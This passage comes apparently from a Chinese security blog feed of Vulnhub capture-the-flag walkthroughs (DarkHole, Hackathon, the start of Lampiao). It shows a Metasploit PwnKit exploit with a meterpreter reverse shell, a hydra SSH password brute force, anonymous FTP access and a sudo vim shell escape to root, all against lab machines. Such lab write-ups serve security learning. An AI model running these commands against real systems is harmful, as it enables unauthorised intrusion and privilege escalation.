exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) &gt; sessions <br><br>Active sessions<br>===============<br><br>  Id  Name  Type                   Information          Connection<br>  --  ----  ----                   -----------          ----------<br>  1         meterpreter php/linux  www-data @ darkhole  192.168.1.5:4444 -&gt; 192.168.1.4:37968 (192.168.1.4<br>                                                        )<br><br>msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) &gt; <span class="hljs-built_in">set</span> session 1<br>session =&gt; 1<br>msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) &gt; run<br><br>[*] Started reverse TCP handler on 192.168.1.5:4444 <br>[*] Running automatic check (<span class="hljs-string">&quot;set AutoCheck false&quot;</span> to <span class="hljs-built_in">disable</span>)<br>[!] Verify cleanup of /tmp/.dhoapptcyi<br>[+] The target is vulnerable.<br>[*] Writing <span class="hljs-string">&#x27;/tmp/.bhwmihxok/xtkbwpd/xtkbwpd.so&#x27;</span> (548 bytes) ...<br>[!] Verify cleanup of /tmp/.bhwmihxok<br>[*] Sending stage (3045380 bytes) to 192.168.1.4<br>[+] Deleted /tmp/.bhwmihxok/xtkbwpd/xtkbwpd.so<br>[+] Deleted /tmp/.bhwmihxok/.jqyjmbhdcuu<br>[+] Deleted /tmp/.bhwmihxok<br>[*] Meterpreter session 2 opened (192.168.1.5:4444 -&gt; 192.168.1.4:37970) at 2025-02-08 23:00:06 +0800<br>meterpreter &gt;<br></code></pre></td></tr></table></figure><p>（6）成功提权到<code>root</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; getuid<br>Server username: root<br></code></pre></td></tr></table></figure><p><strong>读取flag</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; shell<br>Process 12372 created.<br>Channel 1 created.<br><span class="hljs-built_in">cat</span> /root/root.txt<br>DarkHole&#123;You_Are_Legend&#125;<br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>（1）哥斯拉可以使用模块<code>PMeterpreter</code>进行反弹shell<br>（2）Polkit（以前称为 PolicyKit）是一个用于在类 Unix 操作系统中控制系统范围权限的组件。它为非特权进程与特权进程通信提供了一种有组织的方式。也可以使用 polkit 执行具有提升权限的命令，使用命令 pkexec 后跟要执行的命令（具有 root 权限）。</p>]]></content>
    
    
    <categories>
      
      <category>Vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件上传</tag>
      
      <tag>提权-pwnkit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hackathon</title>
    <link href="/Vulnhub/Hackathon/"/>
    <url>/Vulnhub/Hackathon/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p><a href="https://vulnhub.com/entry/hackathonctf-2,714/">https://vulnhub.com/entry/hackathonctf-2,714/</a></p><h1 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/hackathon]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sn 192.168.1.0/24<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 15:41 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.1<br>Host is up (0.00013s latency).<br>MAC Address: 00:50:56:C0:00:08 (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.2<br>Host is up (0.000064s latency).<br>MAC Address: 00:50:56:E8:96:F1 (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.3<br>Host is up (0.00053s latency).<br>MAC Address: 00:0C:29:29:CD:DA (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.254<br>Host is up (0.00014s latency).<br>MAC Address: 00:50:56:EF:22:46 (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.5<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (5 hosts up) scanned <span class="hljs-keyword">in</span> 28.22 seconds<br></code></pre></td></tr></table></figure><ul><li>发现存活主机：192.168.1.3</li></ul><h1 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h1><p>（1）进行端口扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/hackathon]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sT --min-rate 10000 -p- 192.168.1.3 -oA nmapscan/ports<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 15:42 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.3<br>Host is up (0.0025s latency).<br>Not shown: 65532 closed tcp ports (conn-refused)<br>PORT     STATE SERVICE<br>21/tcp   open  ftp<br>80/tcp   open  http<br>7223/tcp open  unknown<br>MAC Address: 00:0C:29:29:CD:DA (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 19.73 seconds<br></code></pre></td></tr></table></figure><ul><li>发现开放端口21,80,7223<br>（2）对端口细节进行扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/hackathon]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sT -sV -O --min-rate 10000 -p21,80,7223 192.168.1.3 -oA nmapscan/detail<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 15:44 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.3<br>Host is up (0.00056s latency).<br><br>PORT     STATE SERVICE VERSION<br>21/tcp   open  ftp     vsftpd 3.0.3<br>80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))<br>7223/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)<br>MAC Address: 00:0C:29:29:CD:DA (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 20.86 seconds<br></code></pre></td></tr></table></figure></li><li>发现21端口是ftp服务，80端口是http，7223端口是ssh<br>（3）进行UDP扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/hackathon]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sU -p21,80,7723 192.168.1.3 -oA nmapscan/udp<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 15:45 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.3<br>Host is up (0.0011s latency).<br><br>PORT     STATE  SERVICE<br>21/udp   closed ftp<br>80/udp   closed http<br>7723/udp closed unknown<br>MAC Address: 00:0C:29:29:CD:DA (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 13.30 seconds<br></code></pre></td></tr></table></figure></li><li>没有开放任何端口<br>（4）进行漏洞扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/hackathon]<br>└─$ <span class="hljs-built_in">sudo</span> nmap --script=vuln -p21,80,7723 192.168.1.3 -oA nmapscan/vuln<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 15:46 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.3<br>Host is up (0.00056s latency).<br><br>PORT     STATE  SERVICE<br>21/tcp   open   ftp<br>80/tcp   open   http<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.<br>| http-enum: <br>|_  /robots.txt: Robots file<br>|_http-csrf: Couldn<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">7723/tcp closed unknown</span><br><span class="hljs-string">MAC Address: 00:0C:29:29:CD:DA (VMware)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 44.50 seconds</span><br></code></pre></td></tr></table></figure></li><li>没有任何东西</li></ul><h1 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h1><h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><p>（1）访问80端口，发现是一个静态页面，没有任何东西<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502081625362.png"><br>（2）对80端口进行目录扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/hackathon]<br>└─$ <span class="hljs-built_in">sudo</span> gobuster <span class="hljs-built_in">dir</span> -u http://192.168.1.3 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.1.3<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              html,php,txt<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.html                (Status: 403) [Size: 276]<br>/index.html           (Status: 200) [Size: 1254]<br>/robots.txt           (Status: 200) [Size: 70]<br>/happy                (Status: 200) [Size: 110]<br>/.html                (Status: 403) [Size: 276]<br>/server-status        (Status: 403) [Size: 276]<br>Progress: 830572 / 830576 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><ul><li>发现两个有用的目录，<code>robots.txt</code>和<code>happy</code><br>（3）依次访问，<code>robots.txt</code>中没有任何东西，<code>happy</code>中提示<code>Nothing is in here</code>，查看页面源码，找到一个<code>username：hackathonll</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502081628432.png"><br>80端口渗透基本结束</li></ul><h2 id="21端口渗透"><a href="#21端口渗透" class="headerlink" title="21端口渗透"></a>21端口渗透</h2><p>（1）由于21端口是一个ftp服务，尝试进行匿名登录，发现能够成功进行登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/hackathon]<br>└─$ ftp 192.168.1.3<br>Connected to 192.168.1.3.<br>220 (vsFTPd 3.0.3)<br>Name (192.168.1.3:kali): anonymous<br>331 Please specify the password.<br>Password: <br>230 Login successful.<br>Remote system <span class="hljs-built_in">type</span> is UNIX.<br>Using binary mode to transfer files.<br>ftp&gt; <br></code></pre></td></tr></table></figure><p>（2）查看服务下面的内容，发现两个文件<code>flag1.txt</code>和<code>word.dir</code>，下载到本地，提示权限不够，可能是由于当前所在目录没有写权限造成，换个目录就好了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">ftp&gt; <span class="hljs-built_in">ls</span><br>229 Entering Extended Passive Mode (|||22621|)<br>150 Here comes the directory listing.<br>-rw-r--r--    1 1000     1000           47 Jun 18  2021 flag1.txt<br>-rw-r--r--    1 1000     1000          849 Jun 19  2021 word.dir<br>226 Directory send OK.<br>ftp&gt; get flag1.txt<br><span class="hljs-built_in">local</span>: flag1.txt remote: flag1.txt<br>ftp: Can<span class="hljs-string">&#x27;t access `flag1.txt&#x27;</span>: 权限不够<br></code></pre></td></tr></table></figure><p>（3）重新换一个目录进行登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">ftp&gt; get flag1.txt<br><span class="hljs-built_in">local</span>: flag1.txt remote: flag1.txt<br>229 Entering Extended Passive Mode (|||10580|)<br>150 Opening BINARY mode data connection <span class="hljs-keyword">for</span> flag1.txt (47 bytes).<br>100% |*****************************************************************************************|    47        2.98 KiB/s    00:00 ETA<br>226 Transfer complete.<br>47 bytes received <span class="hljs-keyword">in</span> 00:00 (2.64 KiB/s)<br>ftp&gt; get word.dir<br><span class="hljs-built_in">local</span>: word.dir remote: word.dir<br>229 Entering Extended Passive Mode (|||54839|)<br>150 Opening BINARY mode data connection <span class="hljs-keyword">for</span> word.dir (849 bytes).<br>100% |*****************************************************************************************|   849      277.84 KiB/s    00:00 ETA<br>226 Transfer complete.<br>849 bytes received <span class="hljs-keyword">in</span> 00:00 (217.04 KiB/s)<br></code></pre></td></tr></table></figure><p>（4）找到第一个flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/hackathon]<br>└─$ <span class="hljs-built_in">cat</span> flag1.txt             <br>₣Ⱡ₳₲&#123;7e3c118631b68d159d9399bda66fc684&#125;<br></code></pre></td></tr></table></figure><h2 id="7223端口渗透"><a href="#7223端口渗透" class="headerlink" title="7223端口渗透"></a>7223端口渗透</h2><p>（1）由于7223端口的服务是ssh，结合上述的渗透，找到了一个用户名和字典，尝试进行ssh的密码爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/hackathon]<br>└─$ hydra -l hackathonll -P word.txt ssh://192.168.1.3:7223 -f<br>Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-08 16:14:56<br>[WARNING] Many SSH configurations <span class="hljs-built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 110 login tries (l:1/p:110), ~7 tries per task<br>[DATA] attacking ssh://192.168.1.3:7223/<br>[7223][ssh] host: 192.168.1.3   login: hackathonll   password: Ti@gO<br>[STATUS] attack finished <span class="hljs-keyword">for</span> 192.168.1.3 (valid pair found)<br>1 of 1 target successfully completed, 1 valid password found<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-08 16:15:03<br></code></pre></td></tr></table></figure><ul><li>成功爆出密码是<code>Ti@gO</code><br>（2）进行ssh登录，成功进入<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/hackathon]<br>└─$ ssh hackathonll@192.168.1.3 -p 7223<br>The authenticity of host <span class="hljs-string">&#x27;[192.168.1.3]:7223 ([192.168.1.3]:7223)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:kVyS5RqS8tFczs71LETg90vnsj/ZLDrqbn91uPP1Cik.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>[192.168.1.3]:7223<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">hackathonll@192.168.1.3&#x27;</span>s password: <br>Last login: Sat Jun 19 05:35:15 2021 from 10.0.0.110<br>$ <span class="hljs-built_in">id</span><br>uid=1001(hackathonll) gid=1001(hackathonll) <span class="hljs-built_in">groups</span>=1001(hackathonll)<br></code></pre></td></tr></table></figure></li></ul><h1 id="提权-vim"><a href="#提权-vim" class="headerlink" title="提权-vim"></a>提权-vim</h1><p>（1）使用<code>sudo -l</code>，查看有没有不需要密码也可以执行<code>root</code>权限的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> hackathonll on hackathon:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User hackathonll may run the following commands on hackathon:<br>    (root) NOPASSWD: /usr/bin/vim<br></code></pre></td></tr></table></figure><ul><li>发现<code>vim</code>不需要密码即可以<code>root</code>权限执行<br>（2）执行提权命令<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">sudo</span> vim -c <span class="hljs-string">&#x27;:!/bin/sh&#x27;</span><br><br><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure></li><li>命令链接：<a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></li></ul><p><strong>读取第二个flag</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># cat /root/flag2.txt</span><br>₣Ⱡ₳₲&#123;7e3c118631b68d159d9399bda66fc694&#125;<br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>（1）ftp的渗透，尝试用<code>anonymous </code>和空密码登录，成功登录后，使用<code>ls</code>查看服务器里面有什么文件，使用get下载到本地<br>（2）<code>hydra</code>爆破，使用教程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -L users.txt -P pass.txt ssh://ip -f<br>targetIP是目标服务器的IP地址<br>ftp 是协议<br>-L 指定一个帐号字典<br>-l 指定用户<br>-P 指定一个密码字典<br>-p 指定密码<br>-V 现实爆破测试的详细过程<br>-f 成功爆破一个账号就停止爆破<br></code></pre></td></tr></table></figure><p>（3）vim提权，首先输入<code>sudo -l</code>，查看哪些命令不需要输入密码即可执行root权限，然后执行相关的提权命令，<a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>]]></content>
    
    
    <categories>
      
      <category>Vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sudo-vim</tag>
      
      <tag>hydra</tag>
      
      <tag>ftp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lampiao</title>
    <link href="/Vulnhub/Lampiao/"/>
    <url>/Vulnhub/Lampiao/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p><a href="https://www.vulnhub.com/entry/lampiao-1,249/">https://www.vulnhub.com/entry/lampiao-1,249/</a></p><h1 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sn 192.168.2.0/24<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 10:20 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00068s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00043s latency).<br>MAC Address: 08:00:27:07:6D:A0 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.10<br>Host is up (0.00067s latency).<br>MAC Address: 08:00:27:62:07:F9 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 28.07 seconds<br></code></pre></td></tr></table></figure><h1 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h1><p>（1）进行端口扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/lampiao]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sT --min-rate 10000 -p- 192.168.2.10 -oA nmapscan/ports            <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 10:22 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.10<br>Host is up (0.0021s latency).<br>Not shown: 65532 closed tcp ports (conn-refused)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>1898/tcp open  cymtec-port<br>MAC Address: 08:00:27:62:07:F9 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 22.19 seconds<br></code></pre></td></tr></table></figure><ul><li>发现开放端口22,80,1898<br>（2）对端口细节进行扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/lampiao]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sT -sV -O --min-rate 10000 -p22,80,1898 192.168.2.10 -oA nmapscan/detail<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 10:25 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.10<br>Host is up (0.0011s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)<br>80/tcp   open  http?<br>1898/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br>SF-Port80-TCP:V=7.94SVN%I=7%D=2/8%Time=67A6C09D%P=x86_64-pc-linux-gnu%r(NU<br>SF:LL,1179,<span class="hljs-string">&quot;\x20_____\x20_\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\</span><br><span class="hljs-string">SF:\|_\|\x20\|\x20\(_\|\x20\|_\|\n\\_\|\x20\x20\x20\|_\|\x20\x20\\__,_\|\\</span><br><span class="hljs-string">SF:__,_\|_\|\x20\|_\|&quot;</span>);<br>MAC Address: 08:00:27:62:07:F9 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 52.18 seconds<br></code></pre></td></tr></table></figure>（3）进行UDP扫描<figure 